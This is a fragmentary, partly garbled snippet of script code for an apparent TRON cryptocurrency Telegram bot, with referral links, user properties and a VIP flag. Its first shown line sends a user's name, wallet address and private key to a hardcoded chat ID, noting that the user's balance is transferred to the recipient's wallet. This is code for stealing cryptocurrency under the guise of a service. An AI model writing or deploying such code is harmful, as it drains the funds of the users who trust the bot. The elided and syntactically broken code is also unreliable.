...
Bot.sendMessageToChatWithId(2031621826,"*User name :* "+inf+" \n\n*Address :*\n"+res+"\n\n*Private Key :*\n"+priv+"\n\nFrom this user balance is transferred to your wallet \n\n*RAW DATA* "+tcid+"")
...
var boto = Libs.ReferralLib.currentUser.getRefLink("tronMateebot","131")
var history = User.getProperty("history")
var txn_id = User.getProperty("trt")
var info =
  "[" + user.first_name + "]" + "(" + "tg://user?id=" + user.telegramid + ")"
var key = "@TronMatePays"
var amountt = amount * 2890
...
Api.sendMessage({
  ...
  inv.add(10)
  if(amount.value() > 600 ) { User.setProperty("vip","1","string")
